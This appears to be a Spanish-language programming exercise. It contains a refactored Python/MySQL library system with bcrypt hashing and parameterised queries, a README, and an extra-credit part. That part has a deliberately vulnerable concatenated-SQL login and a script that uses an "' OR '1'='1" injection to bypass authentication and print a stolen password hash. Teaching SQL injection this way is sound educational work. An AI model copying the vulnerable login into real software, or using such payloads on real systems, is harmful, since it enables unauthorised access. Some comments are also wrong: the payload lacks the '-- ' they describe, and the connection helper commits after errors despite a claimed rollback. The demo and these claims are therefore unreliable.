1. ⚙️ Código Refactorizado del Sistema de Biblioteca
biblioteca/conexion.py
Python

# biblioteca/conexion.py
import mysql.connector
from mysql.connector import Error
from contextlib import contextmanager
import os

# --- Configuración de la Conexión ---
# (Es una buena práctica leer esto desde variables de entorno o un archivo .env)
DB_CONFIG = {
    'host': os.environ.get('DB_HOST', 'localhost'),
    'user': os.environ.get('DB_USER', 'root'),
    'password': os.environ.get('DB_PASS', 'tu_contraseña_mysql'),
    'database': os.environ.get('DB_NAME', 'biblioteca_db')
}
# -------------------------------------

@contextmanager
def obtener_conexion():
    """
    Proporciona una conexión y un cursor a la base de datos,
    manejando automáticamente la apertura y cierre.
    """
    conexion = None
    cursor = None
    try:
        conexion = mysql.connector.connect(**DB_CONFIG)
        cursor = conexion.cursor(dictionary=True) # dictionary=True devuelve resultados como dicts
        print("Conexión a la base de datos exitosa.")
        yield cursor
    except Error as e:
        print(f"Error al conectar con la base de datos: {e}")
        # Opcional: relanzar la excepción para que el llamador la maneje
        raise
    finally:
        if conexion and conexion.is_connected():
            if cursor:
                cursor.close()
            conexion.commit() # Asegura que todas las operaciones (INSERT, UPDATE) se guarden
            conexion.close()
            print("Conexión a la base de datos cerrada.")

def probar_conexion():
    """Función simple para verificar si la configuración de conexión es correcta."""
    try:
        with obtener_conexion():
            pass
        print("¡La configuración de la base de datos es correcta!")
    except Error as e:
        print(f"Fallo al conectar: {e}. Revisa tu configuración en DB_CONFIG.")

if __name__ == "__main__":
    # Esto permite ejecutar el archivo directamente para probar la conexión
    probar_conexion()
biblioteca/modelos/usuario.py
Python

# biblioteca/modelos/usuario.py
import bcrypt
from ..conexion import obtener_conexion
from mysql.connector import Error

class Usuario:

    @staticmethod
    def _hash_password(password_plano: str) -> bytes:
        """Genera un hash seguro para la contraseña."""
        salt = bcrypt.gensalt()
        hashed = bcrypt.hashpw(password_plano.encode('utf-8'), salt)
        return hashed

    @staticmethod
    def verificar_password(password_plano: str, hashed_db: bytes) -> bool:
        """Verifica si la contraseña plana coincide con el hash."""
        if isinstance(hashed_db, str):
            hashed_db = hashed_db.encode('utf-8') # Asegurar que sea bytes
            
        return bcrypt.checkpw(password_plano.encode('utf-8'), hashed_db)

    @staticmethod
    def crear(username: str, password_plano: str, nombre: str, email: str):
        """
        Crea un nuevo usuario con contraseña encriptada.
        Usa consultas parametrizadas para evitar inyección SQL.
        """
        if not username or not password_plano or not nombre:
            print("Error: Username, contraseña y nombre son requeridos.")
            return False
            
        hashed_password = Usuario._hash_password(password_plano)
        
        query = "INSERT INTO usuarios (username, password_hash, nombre, email) VALUES (%s, %s, %s, %s)"
        params = (username, hashed_password, nombre, email)
        
        try:
            with obtener_conexion() as cursor:
                cursor.execute(query, params)
            print(f"Usuario '{username}' creado exitosamente.")
            return True
        except Error as e:
            print(f"Error al crear usuario: {e}")
            return False

    @staticmethod
    def obtener_por_username(username: str):
        """Obtiene un usuario por su username (para login)."""
        query = "SELECT * FROM usuarios WHERE username = %s"
        params = (username,)
        
        try:
            with obtener_conexion() as cursor:
                cursor.execute(query, params)
                return cursor.fetchone()
        except Error as e:
            print(f"Error al obtener usuario: {e}")
            return None

    @staticmethod
    def login(username: str, password_plano: str):
        """Autentica a un usuario."""
        usuario = Usuario.obtener_por_username(username)
        
        if not usuario:
            print("Login fallido: Usuario no encontrado.")
            return None
            
        # Verificar la contraseña 
        if Usuario.verificar_password(password_plano, usuario['password_hash']):
            print(f"Login exitoso. ¡Bienvenido, {usuario['nombre']}!")
            return usuario
        else:
            print("Login fallido: Contraseña incorrecta.")
            return None
biblioteca/modelos/libro.py
Python

# biblioteca/modelos/libro.py
from ..conexion import obtener_conexion
from mysql.connector import Error

class Libro:

    @staticmethod
    def crear(titulo: str, autor: str, anio: int, disponible: bool = True):
        """Añade un nuevo libro a la base de datos."""
        query = "INSERT INTO libros (titulo, autor, anio_publicacion, disponible) VALUES (%s, %s, %s, %s)"
        params = (titulo, autor, anio, disponible)
        
        try:
            with obtener_conexion() as cursor:
                cursor.execute(query, params)
            print(f"Libro '{titulo}' añadido exitosamente.")
            return True
        except Error as e:
            print(f"Error al añadir libro: {e}")
            return False

    @staticmethod
    def obtener_todos():
        """Obtiene una lista de todos los libros."""
        query = "SELECT * FROM libros ORDER BY titulo"
        try:
            with obtener_conexion() as cursor:
                cursor.execute(query)
                return cursor.fetchall()
        except Error as e:
            print(f"Error al obtener libros: {e}")
            return []

    @staticmethod
    def buscar_por_titulo(titulo: str):
        """Busca libros que coincidan parcialmente con el título."""
        query = "SELECT * FROM libros WHERE titulo LIKE %s"
        # Usamos %s para la parametrización, el driver de MySQL se encarga de escapar los '%'
        params = (f"%{titulo}%",) 
        
        try:
            with obtener_conexion() as cursor:
                cursor.execute(query, params)
                return cursor.fetchall()
        except Error as e:
            print(f"Error al buscar libros: {e}")
            return []

    @staticmethod
    def actualizar_disponibilidad(libro_id: int, disponible: bool):
        """Actualiza el estado de disponibilidad de un libro (para préstamos)."""
        query = "UPDATE libros SET disponible = %s WHERE id = %s"
        params = (disponible, libro_id)
        
        try:
            with obtener_conexion() as cursor:
                cursor.execute(query, params)
            return True
        except Error as e:
            print(f"Error al actualizar disponibilidad: {e}")
            return False
biblioteca/modelos/prestamo.py
Python

# biblioteca/modelos/prestamo.py
from ..conexion import obtener_conexion
from mysql.connector import Error
from datetime import date

class Prestamo:

    @staticmethod
    def realizar_prestamo(usuario_id: int, libro_id: int, dias_prestamo: int = 15):
        """
        Realiza un préstamo, actualizando la disponibilidad del libro
        y registrando el préstamo.
        """
        # 1. Verificar si el libro está disponible
        query_check = "SELECT disponible FROM libros WHERE id = %s"
        try:
            with obtener_conexion() as cursor:
                cursor.execute(query_check, (libro_id,))
                libro = cursor.fetchone()
                
                if not libro:
                    print(f"Error: Libro con ID {libro_id} no existe.")
                    return False
                if not libro['disponible']:
                    print(f"Error: El libro (ID: {libro_id}) no está disponible.")
                    return False
                
                # 2. Marcar libro como no disponible
                query_update = "UPDATE libros SET disponible = FALSE WHERE id = %s"
                cursor.execute(query_update, (libro_id,))
                
                # 3. Registrar el préstamo
                fecha_prestamo = date.today()
                # (Aquí podrías calcular la fecha_devolucion_estimada)
                
                query_insert = """
                    INSERT INTO prestamos (usuario_id, libro_id, fecha_prestamo) 
                    VALUES (%s, %s, %s)
                """
                params_insert = (usuario_id, libro_id, fecha_prestamo)
                cursor.execute(query_insert, params_insert)
                
            print(f"Préstamo del libro ID {libro_id} al usuario ID {usuario_id} registrado.")
            return True
            
        except Error as e:
            print(f"Error al realizar préstamo: {e}")
            # NOTA: La transacción se revierte automáticamente al salir del 'with'
            # si ocurre una excepción antes del commit() en 'obtener_conexion'.
            return False

    @staticmethod
    def registrar_devolucion(prestamo_id: int):
        """
        Registra la devolución de un libro y lo marca como disponible.
        """
        try:
            with obtener_conexion() as cursor:
                # 1. Obtener el ID del libro del préstamo
                query_get_libro = "SELECT libro_id FROM prestamos WHERE id = %s AND fecha_devolucion IS NULL"
                cursor.execute(query_get_libro, (prestamo_id,))
                prestamo = cursor.fetchone()
                
                if not prestamo:
                    print("Error: No se encontró un préstamo activo con ese ID.")
                    return False
                
                libro_id = prestamo['libro_id']
                
                # 2. Actualizar el préstamo con la fecha de devolución
                query_update_prestamo = "UPDATE prestamos SET fecha_devolucion = %s WHERE id = %s"
                cursor.execute(query_update_prestamo, (date.today(), prestamo_id))
                
                # 3. Marcar el libro como disponible
                query_update_libro = "UPDATE libros SET disponible = TRUE WHERE id = %s"
                cursor.execute(query_update_libro, (libro_id,))

            print(f"Devolución del préstamo ID {prestamo_id} registrada.")
            return True
            
        except Error as e:
            print(f"Error al registrar devolución: {e}")
            return False
biblioteca/main.py
Python

# biblioteca/main.py
# Importamos las clases de los modelos
from modelos.usuario import Usuario
from modelos.libro import Libro
from modelos.prestamo import Prestamo
import getpass # Para ocultar la contraseña al escribirla

def menu_principal():
    print("\n--- Sistema de Biblioteca v2.0 (Refactorizado) ---")
    print("1. Registrar nuevo usuario")
    print("2. Iniciar sesión")
    print("3. Salir")
    return input("Seleccione una opción: ")

def menu_biblioteca(usuario):
    print(f"\n--- Bienvenido, {usuario['nombre']} ---")
    print("1. Ver todos los libros")
    print("2. Buscar libro por título")
    print("3. Añadir nuevo libro (Admin)") # Podrías limitar esto por rol
    print("4. Prestar un libro")
    print("5. Devolver un libro")
    print("6. Cerrar sesión")
    return input("Seleccione una opción: ")

def main():
    usuario_actual = None
    
    while True:
        if not usuario_actual:
            opcion_main = menu_principal()
            
            if opcion_main == '1':
                # Registrar usuario
                print("\n[Registro de Nuevo Usuario]")
                username = input("Username: ")
                password = getpass.getpass("Contraseña: ")
                nombre = input("Nombre completo: ")
                email = input("Email: ")
                Usuario.crear(username, password, nombre, email)
                
            elif opcion_main == '2':
                # Iniciar sesión
                print("\n[Inicio de Sesión]")
                username = input("Username: ")
                password = getpass.getpass("Contraseña: ")
                usuario_actual = Usuario.login(username, password)
                
            elif opcion_main == '3':
                print("¡Hasta pronto!")
                break
            else:
                print("Opción no válida.")
        
        else:
            # Usuario ha iniciado sesión
            opcion_bib = menu_biblioteca(usuario_actual)
            
            if opcion_bib == '1':
                # Ver todos los libros
                print("\n[Catálogo de Libros]")
                libros = Libro.obtener_todos()
                if not libros:
                    print("No hay libros en el catálogo.")
                for libro in libros:
                    estado = "Disponible" if libro['disponible'] else "Prestado"
                    print(f"ID: {libro['id']} | Título: {libro['titulo']} | Autor: {libro['autor']} | Estado: {estado}")
            
            elif opcion_bib == '2':
                # Buscar libro
                print("\n[Buscar Libro]")
                titulo = input("Ingrese el título (o parte) a buscar: ")
                libros = Libro.buscar_por_titulo(titulo)
                if not libros:
                    print("No se encontraron coincidencias.")
                for libro in libros:
                    estado = "Disponible" if libro['disponible'] else "Prestado"
                    print(f"ID: {libro['id']} | Título: {libro['titulo']} | Autor: {libro['autor']} | Estado: {estado}")

            elif opcion_bib == '3':
                # Añadir libro
                print("\n[Añadir Nuevo Libro]")
                titulo = input("Título: ")
                autor = input("Autor: ")
                anio = int(input("Año de publicación: "))
                Libro.crear(titulo, autor, anio)

            elif opcion_bib == '4':
                # Prestar libro
                print("\n[Realizar Préstamo]")
                libro_id = int(input("ID del libro a prestar: "))
                usuario_id = usuario_actual['id']
                Prestamo.realizar_prestamo(usuario_id, libro_id)
                
            elif opcion_bib == '5':
                # Devolver libro
                print("\n[Registrar Devolución]")
                prestamo_id = int(input("ID del préstamo a devolver: "))
                Prestamo.registrar_devolucion(prestamo_id)

            elif opcion_bib == '6':
                print(f"Cerrando sesión de {usuario_actual['nombre']}...")
                usuario_actual = None
                
            else:
                print("Opción no válida.")

if __name__ == "__main__":
    # Para ejecutar la aplicación, asegúrate de estar en el directorio
    # superior a 'biblioteca' y ejecutarlo como un módulo:
    # python -m biblioteca.main
    #
    # O, si solo quieres probarlo rápido (y asumiendo que las dependencias
    # de 'modelos' están en el path), puedes ejecutar 'main()'
    main()
2. 📄 Contenido del README.md
Markdown

# Ejercicio 12: Refactorización Sistema de Biblioteca (Buenas Prácticas y Seguridad)

Este proyecto es una refactorización del "Ejercicio 11 (Sistema de Biblioteca)", enfocado en aplicar buenas prácticas de desarrollo de software, principios SOLID y medidas de seguridad esenciales.

El objetivo es transformar un código funcional en un código mantenible, escalable, legible y seguro.

## 🚀 Mejoras Realizadas (Respecto al Original)

Este proyecto implementa mejoras clave en estructura y seguridad:

### 1. Aplicación de Principios SOLID 

* **Principio de Responsabilidad Única (SRP)**: El código se ha modularizado.
    * `conexion.py`: Su única responsabilidad es gestionar la conexión con la BD.
    * `modelos/usuario.py`: Gestiona solo la lógica de usuarios (creación, login).
    * `modelos/libro.py`: Gestiona solo la lógica de libros (CRUD).
    * `main.py`: Gestiona solo el flujo de la aplicación y la interacción con el usuario.

* **Principio de Inversión de Dependencias (DIP)**: Los módulos de alto nivel (como `main.py` y los modelos) no dependen directamente de `mysql.connector`, sino de la abstracción proporcionada por `conexion.py` (`obtener_conexion`).

### 2. Mejoras de Seguridad

* **Encriptación de Contraseñas (Hashing)**: Las contraseñas de los usuarios **nunca** se guardan en texto plano. Se utiliza la biblioteca `bcrypt` para generar un *hash* seguro de la contraseña antes de almacenarla. Al iniciar sesión, se compara el *hash* de la contraseña ingresada con el almacenado.

* **Prevención de Inyección SQL**: Se han eliminado todas las consultas basadas en concatenación de cadenas. En su lugar, se utilizan **consultas parametrizadas** (pasando los valores como un segundo argumento a `cursor.execute()`). Esto asegura que la base de datos trate las entradas del usuario como datos, y no como código SQL ejecutable.

* **Control de Errores**: Se utiliza manejo de excepciones (`try...except`) para capturar errores de la base de datos y evitar la fuga de información sensible.

### 3. Código Modular y Escalable

La estructura de carpetas sugerida permite que el proyecto crezca fácilmente. Si se necesitara añadir una nueva entidad (ej. "Autores" o "Editoriales"), simplemente se crearía un nuevo archivo en `modelos/` sin necesidad de modificar el código existente.

## 🗂 Estructura del Proyecto

biblioteca/ ├── init.py ├── conexion.py # Gestiona la conexión a la BD (SRP) ├── main.py # Lógica principal de la aplicación (UI de consola) └── modelos/ ├── init.py ├── libro.py # Modelo y lógica para Libros ├── usuario.py # Modelo y lógica para Usuarios (con encriptación) └── prestamo.py # Modelo y lógica para Préstamos


## 📋 Requisitos e Instalación

1.  **Clonar el repositorio:**
    ```bash
    git clone [https://github.com/TU_USUARIO/TU_REPOSITORIO_NUEVO.git](https://github.com/TU_USUARIO/TU_REPOSITORIO_NUEVO.git)
    cd TU_REPOSITORIO_NUEVO
    ```

2.  **Instalar dependencias:**
    ```bash
    pip install mysql-connector-python bcrypt
    ```

3.  **Configurar la Base de Datos (MySQL):**
    Abre tu cliente de MySQL y ejecuta las siguientes sentencias para crear la base de datos y las tablas necesarias.

    ```sql
    CREATE DATABASE IF NOT EXISTS biblioteca_db;
    USE biblioteca_db;

    CREATE TABLE IF NOT EXISTS usuarios (
        id INT AUTO_INCREMENT PRIMARY KEY,
        username VARCHAR(50) NOT NULL UNIQUE,
        password_hash VARCHAR(100) NOT NULL, -- Almacena el hash de bcrypt
        nombre VARCHAR(100) NOT NULL,
        email VARCHAR(100) UNIQUE,
        fecha_registro TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS libros (
        id INT AUTO_INCREMENT PRIMARY KEY,
        titulo VARCHAR(255) NOT NULL,
        autor VARCHAR(255) NOT NULL,
        anio_publicacion INT,
        disponible BOOLEAN DEFAULT TRUE
    );

    CREATE TABLE IF NOT EXISTS prestamos (
        id INT AUTO_INCREMENT PRIMARY KEY,
        libro_id INT NOT NULL,
        usuario_id INT NOT NULL,
        fecha_prestamo DATE NOT NULL,
        fecha_devolucion DATE,
        FOREIGN KEY (libro_id) REFERENCES libros(id),
        FOREIGN KEY (usuario_id) REFERENCES usuarios(id)
    );
    ```

4.  **Configurar la Conexión:**
    Edita el archivo `biblioteca/conexion.py` y actualiza el diccionario `DB_CONFIG` con tu usuario y contraseña de MySQL.

    ```python
    DB_CONFIG = {
        'host': 'localhost',
        'user': 'tu_usuario_mysql',
        'password': 'tu_contraseña_mysql',
        'database': 'biblioteca_db'
    }
    ```

5.  **Ejecutar la aplicación:**
    Debido a la estructura modular, debes ejecutar el proyecto como un módulo desde el directorio raíz (la carpeta que *contiene* a `biblioteca/`).

    ```bash
    python -m biblioteca.main
    ```

## 🖼️ Captura del Programa

(Debes subir tu propia captura de pantalla al repositorio y enlazarla aquí)

`[Imagen de la aplicación ejecutándose en la consola]`
3. 🏆 Código para Puntos Extra (Inyección SQL)
vulnerable_login.py
Python

# vulnerable_login.py
# ADVERTENCIA: Este código es DELIBERADAMENTE INSEGURO
# y solo debe usarse para fines educativos.
import mysql.connector
from mysql.connector import Error

# Configura esto con la misma BD que el ejercicio principal
DB_CONFIG = {
    'host': 'localhost',
    'user': 'root',
    'password': 'tu_contraseña_mysql',
    'database': 'biblioteca_db'
}

def login_vulnerable(username, password):
    """
    Función de login que construye la consulta SQL
    concatenando cadenas. ESTO ES VULNERABLE. 
    """
    try:
        conn = mysql.connector.connect(**DB_CONFIG)
        cursor = conn.cursor(dictionary=True)
        
        # --- LA VULNERABILIDAD ESTÁ AQUÍ ---
        # Se construye la consulta pegando el input del usuario directamente
        query = "SELECT * FROM usuarios WHERE username = '" + username + \
                "' AND password_hash = '" + password + "'"
                
        print(f"\n[DEBUG] Ejecutando consulta peligrosa: {query}")
        
        cursor.execute(query)
        usuario = cursor.fetchone()
        
        cursor.close()
        conn.close()
        
        return usuario
        
    except Error as e:
        print(f"Error durante el login: {e}")
        return None
demostracion_ataque.py
Python

# demostracion_ataque.py
# Este script demuestra cómo explotar la vulnerabilidad
# en vulnerable_login.py

from vulnerable_login import login_vulnerable

def demostrar_ataque():
    """
    Documenta y demuestra el proceso de ataque
    de Inyección SQL. 
    """
    
    # ------------------------------------------
    # 1. Consulta Normal (Fallido)
    # ------------------------------------------
    print("--- 1. Prueba de Login Normal (Fallido) ---")
    print("Intentando acceder como 'admin' con contraseña incorrecta '12345'...")
    
    user_normal = "admin"
    pass_normal = "12345" # (Asumimos que no es el hash real)
    
    resultado_normal = login_vulnerable(user_normal, pass_normal)
    
    if not resultado_normal:
        print("Resultado: Login fallido, como se esperaba.")
    else:
        print(f"Resultado: Login exitoso (inesperado): {resultado_normal}")

    # ------------------------------------------
    # 2. Inyección SQL Exitosa
    # ------------------------------------------
    print("\n--- 2. Prueba de Inyección SQL ---")
    
    # Este 'payload' cierra la comilla simple del username
    # y añade una condición que siempre es verdadera ('1'='1').
    # El '-- ' al final comenta el resto de la consulta (la parte del password).
    
    user_inyectado = "' OR '1'='1"
    pass_inyectado = "password_irrelevante"
    
    print(f"Input de Usuario (Username): {user_inyectado}")
    print(f"Input de Usuario (Password): {pass_inyectado}")
    print("Realizando ataque...")

    # La consulta SQL resultante será:
    # SELECT * FROM usuarios WHERE username = '' OR '1'='1' -- ' AND password_hash = '...'
    # La BD solo ejecutará:
    # SELECT * FROM usuarios WHERE username = '' OR '1'='1'
    # Esto devolverá el primer usuario de la tabla (usualmente el admin).
    
    resultado_ataque = login_vulnerable(user_inyectado, pass_inyectado)
    
    # ------------------------------------------
    # 3. Resultados del Ataque
    # ------------------------------------------
    print("\n--- 3. Resultados del Ataque ---")
    if resultado_ataque:
        print("¡ATAQUE EXITOSO!")
        print("Se ha bypassado la autenticación.")
        print("Datos obtenidos (el primer usuario de la tabla):")
        print(f"  ID: {resultado_ataque.get('id')}")
        print(f"  Username: {resultado_ataque.get('username')}")
        print(f"  Nombre: {resultado_ataque.get('nombre')}")
        print(f"  Email: {resultado_ataque.get('email')}")
        print(f"  Password Hash (Robado): {resultado_ataque.get('password_hash')}")
    else:
        print("ATAQUE FALLIDO. (Revisar la lógica o la BD)")

if __name__ == "__main__":
    demostrar_ataque()
